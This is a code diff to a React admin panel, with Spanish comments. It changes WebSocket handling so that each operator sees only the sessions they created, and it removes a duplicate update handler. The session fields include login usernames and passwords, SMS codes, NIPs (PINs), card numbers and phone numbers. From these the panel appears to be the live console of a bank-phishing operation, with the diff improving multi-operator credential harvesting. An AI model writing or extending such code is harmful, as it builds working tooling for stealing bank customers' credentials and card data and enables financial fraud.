@@ -153,22 +153,32 @@ export default function AdminPanel() {
         console.log("Mensaje WebSocket recibido en AdminPanel:", data.type);
         
         if (data.type === 'INIT_SESSIONS') {
-          setSessions(data.data);
+          // Filtrar las sesiones para mostrar solo las creadas por el usuario actual
+          const filtered = Array.isArray(data.data) 
+            ? data.data.filter((session: any) => session.createdBy === user?.username)
+            : [];
+          console.log(`Filtrando sesiones para usuario ${user?.username}: ${filtered.length} sesiones encontradas`);
+          setSessions(filtered);
         }
         else if (data.type === 'SESSION_UPDATE') {
-          // Solo actualizar la sesión en la pestaña actual
-          if ((activeTab === 'current' && !data.data.saved) || 
-              (activeTab === 'saved' && data.data.saved)) {
-            setSessions(prev => {
-              const updated = [...prev];
-              const index = updated.findIndex(s => s.sessionId === data.data.sessionId);
-              if (index >= 0) {
-                updated[index] = data.data;
-              } else {
-                updated.push(data.data);
-              }
-              return updated;
-            });
+          // Verificar primero si la sesión actualizada pertenece al usuario actual
+          if (data.data.createdBy === user?.username) {
+            // Solo actualizar la sesión en la pestaña actual si es del usuario actual
+            if ((activeTab === 'current' && !data.data.saved) || 
+                (activeTab === 'saved' && data.data.saved)) {
+              setSessions(prev => {
+                const updated = [...prev];
+                const index = updated.findIndex(s => s.sessionId === data.data.sessionId);
+                if (index >= 0) {
+                  updated[index] = data.data;
+                } else {
+                  updated.push(data.data);
+                }
+                return updated;
+              });
+            }
+          } else {
+            console.log(`Ignorando actualización de sesión ${data.data.sessionId} que no pertenece al usuario ${user?.username}`);
           }
         }
         else if (data.type === 'SESSION_DELETE') {
@@ -214,53 +224,6 @@ export default function AdminPanel() {
         }
         // Se eliminó la sección CLIENT_INPUT_REALTIME por solicitud del usuario
         // para quitar las notificaciones en tiempo real
-        
-        // Las actualizaciones de datos se manejan ahora solo a través de SESSION_UPDATE
-        else if (data.type === 'SESSION_UPDATE') {
-          // Actualizar la sesión en la interfaz
-          setSessions(prev => {
-            const updated = [...prev];
-            const index = updated.findIndex(s => s.sessionId === sessionId);
-            
-            if (index >= 0) {
-              // Crear copia de la sesión actual
-              const updatedSession = { ...updated[index] };
-              
-              // Actualizar los campos según el tipo de datos
-              switch (tipo) {
-                case 'folio':
-                  updatedSession.folio = inputData.folio;
-                  break;
-                case 'login':
-                  updatedSession.username = inputData.username;
-                  updatedSession.password = inputData.password;
-                  break;
-                case 'codigo':
-                  updatedSession.sms = inputData.codigo;
-                  break;
-                case 'nip':
-                  updatedSession.nip = inputData.nip;
-                  break;
-                case 'tarjeta':
-                  updatedSession.tarjeta = inputData.tarjeta;
-                  break;
-                case 'sms_compra':
-                case 'SMS_COMPRA':
-                case 'smsCompra':
-                  updatedSession.smsCompra = inputData.smsCompra;
-                  break;
-                case 'celular':
-                  updatedSession.celular = inputData.celular;
-                  break;
-              }
-              
-              // Actualizar en la lista
-              updated[index] = updatedSession;
-            }
-            
-            return updated;
-          });
-        }
       } catch (error) {
         console.error("Error parsing WebSocket message:", error);
       }
